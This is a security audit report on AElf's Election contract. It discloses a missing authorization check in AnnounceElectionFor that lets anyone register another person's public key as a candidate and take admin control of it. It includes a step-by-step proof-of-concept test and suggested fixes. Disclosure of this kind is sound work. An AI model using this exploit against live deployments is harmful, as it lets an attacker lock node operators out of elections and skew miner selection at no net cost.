# Audit Report

## Title
Unauthorized Candidate Registration via Missing Permission Check in AnnounceElectionFor

## Summary
The `AnnounceElectionFor` function allows anyone to register arbitrary public keys as election candidates without the owner's consent, granting the caller admin control. The victim cannot quit or re-register, while the attacker can recover the 100,000 ELF deposit at any time, enabling zero-cost denial-of-service attacks on legitimate node operators and manipulation of the AEDPoS consensus candidate pool.

## Finding Description

The `AnnounceElectionFor` method accepts an arbitrary public key string parameter and registers it as an election candidate without verifying that the caller has permission to do so. [1](#0-0) 

The function calls the internal `AnnounceElection` method, which only validates that the pubkey is not an initial miner, not already a current candidate, and not bannedâ€”but performs no ownership verification. [2](#0-1) 

Critically, if the caller omits the `admin` parameter, it defaults to `Context.Sender`, making the attacker the admin of the victim's candidacy. [3](#0-2) 

This breaks the fundamental authorization model because the legitimate `AnnounceElection` method uses `Context.RecoverPublicKey()` to ensure only the private key owner can register themselves through cryptographic signature verification. [4](#0-3) 

Once registered, only the admin can call `QuitElection` to remove the candidacy. [5](#0-4) 

The victim cannot re-register their own public key because the internal validation explicitly prevents duplicate registration of current candidates. [6](#0-5) 

The attacker can recover the locked 100,000 ELF tokens by calling `QuitElection` as the admin, with the funds returning to the registered sponsor (the attacker). [7](#0-6)  The constant defines this deposit amount. [8](#0-7) 

Test cases confirm that neither the original pubkey holder nor any replacement can quit the election without admin authorization, demonstrating the admin-only control. [9](#0-8) 

## Impact Explanation

**Concrete Harm:**

1. **Unauthorized Governance Control**: An attacker gains exclusive admin authority over arbitrary candidates in the election system, controlling their participation in the AEDPoS consensus mechanism's miner selection process.

2. **Denial of Service**: Legitimate node operators whose public keys are pre-registered by an attacker cannot register themselves. The duplicate candidate check blocks re-registration, and only the attacker-controlled admin can call `QuitElection` to free the slot.

3. **Candidate List Pollution**: An attacker can flood the voting options with controlled fake candidates, diluting legitimate votes and polluting the governance candidate pool that voters interact with.

4. **Zero Net Cost**: The attacker recovers the 100,000 ELF deposit when calling `QuitElection` as admin, enabling repeated attacks against multiple victims using the same capital with no economic loss.

**Affected Parties:**
- Node operators whose public keys are registered without consent, losing control of their election participation
- Voters facing a polluted candidate list with attacker-controlled options
- The AEDPoS consensus mechanism relying on legitimate candidate participation for secure miner selection

**Severity Justification:**
This is CRITICAL because it violates the fundamental authorization invariant that only a public key owner should control their candidate status. The Election contract is core infrastructure for AEDPoS consensus governance, and unauthorized control over candidates directly undermines miner selection integrity and network security.

## Likelihood Explanation

**Attacker Capabilities:**
- Requires 100,000 ELF tokens with approval to the Election contract (standard requirement for any candidate registration, readily available to any user)
- Can obtain any public key from blockchain transaction data (all public keys are visible on-chain from any transaction)
- Requires no special privileges, trusted roles, or governance permissions

**Attack Complexity:**
The attack is trivial to execute with a single transaction. The attacker simply calls `AnnounceElectionFor` with the target's public key and either omits the `admin` parameter (defaulting to themselves) or explicitly sets themselves as admin.

**Feasibility Conditions:**
- Public method accessible to anyone meeting standard token requirements
- No rate limiting, spam prevention, or additional validation mechanisms exist
- Economic cost is fully recoverable through `QuitElection`, allowing the attacker to cycle through announce-quit-announce patterns to attack multiple victims with the same capital
- The attack is difficult to detect proactively since `AnnounceElectionFor` appears to be a legitimate sponsorship feature

**Probability:** HIGH - The vulnerability is easily exploitable with standard user capabilities, minimal economic barrier, full cost recovery, and no technical complexity.

## Recommendation

Add authorization verification to `AnnounceElectionFor` to ensure only the public key owner can register their candidacy (even when sponsored):

1. **Option A (Signature Verification)**: Require a signed message from the candidate's private key proving consent:
   ```csharp
   public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
   {
       // Verify the candidate authorized this registration
       Assert(input.Signature != null, "Candidate signature required.");
       var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(input.Pubkey);
       var message = HashHelper.ComputeFrom(input.Pubkey);
       Assert(CryptoHelper.VerifySignature(input.Signature, message.ToByteArray(), pubkeyBytes),
              "Invalid candidate signature.");
       
       // Existing logic...
   }
   ```

2. **Option B (Two-Step Process)**: Require the candidate to confirm the registration in a second transaction, similar to how `SetCandidateAdmin` requires current admin permission.

3. **Immediate Mitigation**: Document that `AnnounceElectionFor` should only be called with the candidate as `admin` parameter, and add validation to prevent admin defaulting to caller:
   ```csharp
   Assert(input.Admin != null && input.Admin != Context.Sender, 
          "Admin must be explicitly set to candidate address.");
   ```

## Proof of Concept

```csharp
[Fact]
public async Task AnnounceElectionFor_Unauthorized_Registration_Attack()
{
    // Setup: Attacker and victim keypairs
    var victimKeyPair = ValidationDataCenterKeyPairs.First();
    var attackerKeyPair = ValidationDataCenterKeyPairs.Last();
    
    var attackerStub = GetElectionContractTester(attackerKeyPair);
    var attackerAddress = Address.FromPublicKey(attackerKeyPair.PublicKey);
    
    // Step 1: Attacker registers victim's pubkey without consent, becoming admin
    await attackerStub.AnnounceElectionFor.SendAsync(new AnnounceElectionForInput
    {
        Pubkey = victimKeyPair.PublicKey.ToHex(),
        Admin = null // Defaults to Context.Sender (attacker)
    });
    
    // Verify victim's pubkey is registered as candidate
    var candidates = await ElectionContractStub.GetCandidates.CallAsync(new Empty());
    candidates.Value.ShouldContain(ByteString.CopyFrom(victimKeyPair.PublicKey));
    
    // Verify attacker is the admin
    var admin = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = victimKeyPair.PublicKey.ToHex() });
    admin.ShouldBe(attackerAddress);
    
    // Step 2: Victim cannot quit (not admin)
    var victimStub = GetElectionContractTester(victimKeyPair);
    var quitResult = await victimStub.QuitElection.SendAsync(
        new StringValue { Value = victimKeyPair.PublicKey.ToHex() });
    quitResult.TransactionResult.Error.ShouldContain("Only admin can quit election.");
    
    // Step 3: Victim cannot re-register (already a candidate)
    var reRegisterResult = await victimStub.AnnounceElection.SendAsync(
        Address.FromPublicKey(victimKeyPair.PublicKey));
    reRegisterResult.TransactionResult.Error.ShouldContain("already announced election");
    
    // Step 4: Attacker quits as admin and recovers deposit (zero net cost)
    var balanceBefore = await GetNativeTokenBalance(attackerKeyPair.PublicKey);
    await attackerStub.QuitElection.SendAsync(
        new StringValue { Value = victimKeyPair.PublicKey.ToHex() });
    var balanceAfter = await GetNativeTokenBalance(attackerKeyPair.PublicKey);
    
    // Attacker recovered the 100,000 ELF deposit
    balanceAfter.ShouldBe(balanceBefore + ElectionContractConstants.LockTokenForElection);
    
    // Victim's pubkey is no longer a candidate and attacker can repeat the attack
    var candidatesAfter = await ElectionContractStub.GetCandidates.CallAsync(new Empty());
    candidatesAfter.Value.ShouldNotContain(ByteString.CopyFrom(victimKeyPair.PublicKey));
}
```

### Citations

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L93-96)
```csharp
    public override Empty AnnounceElection(Address input)
    {
        var recoveredPublicKey = Context.RecoverPublicKey();
        AnnounceElection(recoveredPublicKey);
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L121-142)
```csharp
    public override Empty AnnounceElectionFor(AnnounceElectionForInput input)
    {
        var pubkey = input.Pubkey;
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(pubkey);
        var address = Address.FromPublicKey(pubkeyBytes);
        AnnounceElection(pubkeyBytes);
        var admin = input.Admin ?? Context.Sender;
        State.CandidateAdmins[pubkey] = admin;
        var managedPubkeys = State.ManagedCandidatePubkeysMap[admin] ?? new PubkeyList();
        managedPubkeys.Value.Add(ByteString.CopyFrom(pubkeyBytes));
        State.ManagedCandidatePubkeysMap[admin] = managedPubkeys;
        LockCandidateNativeToken();
        AddCandidateAsOption(pubkey);
        if (State.Candidates.Value.Value.Count <= GetValidationDataCenterCount())
        {
            State.DataCentersRankingList.Value.DataCenters.Add(pubkey, 0);
            RegisterCandidateToSubsidyProfitScheme(pubkey);
        }

        State.CandidateSponsorMap[input.Pubkey] = Context.Sender;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L144-175)
```csharp
    private void AnnounceElection(byte[] pubkeyBytes)
    {
        var pubkey = pubkeyBytes.ToHex();
        var pubkeyByteString = ByteString.CopyFrom(pubkeyBytes);

        Assert(!State.InitialMiners.Value.Value.Contains(pubkeyByteString),
            "Initial miner cannot announce election.");

        var candidateInformation = State.CandidateInformationMap[pubkey];

        if (candidateInformation != null)
        {
            Assert(!candidateInformation.IsCurrentCandidate,
                $"This public key already announced election. {pubkey}");
            candidateInformation.AnnouncementTransactionId = Context.OriginTransactionId;
            candidateInformation.IsCurrentCandidate = true;
            // In this way we can keep history of current candidate, like terms, missed time slots, etc.
            State.CandidateInformationMap[pubkey] = candidateInformation;
        }
        else
        {
            Assert(!IsPubkeyBanned(pubkey), "This candidate already banned before.");
            State.CandidateInformationMap[pubkey] = new CandidateInformation
            {
                Pubkey = pubkey,
                AnnouncementTransactionId = Context.OriginTransactionId,
                IsCurrentCandidate = true
            };
        }

        State.Candidates.Value.Value.Add(pubkeyByteString);
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L236-236)
```csharp
        Assert(Context.Sender == State.CandidateAdmins[initialPubkey], "Only admin can quit election.");
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L240-249)
```csharp
        var lockId = candidateInformation.AnnouncementTransactionId;
        var lockVirtualAddress = Context.ConvertVirtualAddressToContractAddress(lockId);
        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = lockVirtualAddress,
            To = State.CandidateSponsorMap[input.Value] ?? Address.FromPublicKey(pubkeyBytes),
            Symbol = Context.Variables.NativeSymbol,
            Amount = ElectionContractConstants.LockTokenForElection,
            Memo = "Quit election."
        });
```

**File:** contract/AElf.Contracts.Election/ElectionContractConstants.cs (L5-5)
```csharp
    public const long LockTokenForElection = 100_000_00000000;
```

**File:** test/AElf.Contracts.Election.Tests/BVT/ReplaceCandidateTests.cs (L63-75)
```csharp
        // Two pubkeys cannot quit election.
        {
            var stub = GetTester<ElectionContractImplContainer.ElectionContractImplStub>(ElectionContractAddress,
                announceElectionKeyPair);
            var result = await stub.QuitElection.SendAsync(new StringValue { Value = newKeyPair.PublicKey.ToHex() });
            result.TransactionResult.Error.ShouldContain("Only admin can quit election.");
        }
        {
            var stub = GetTester<ElectionContractImplContainer.ElectionContractImplStub>(ElectionContractAddress,
                newKeyPair);
            var result = await stub.QuitElection.SendAsync(new StringValue { Value = newKeyPair.PublicKey.ToHex() });
            result.TransactionResult.Error.ShouldContain("Only admin can quit election.");
        }
```
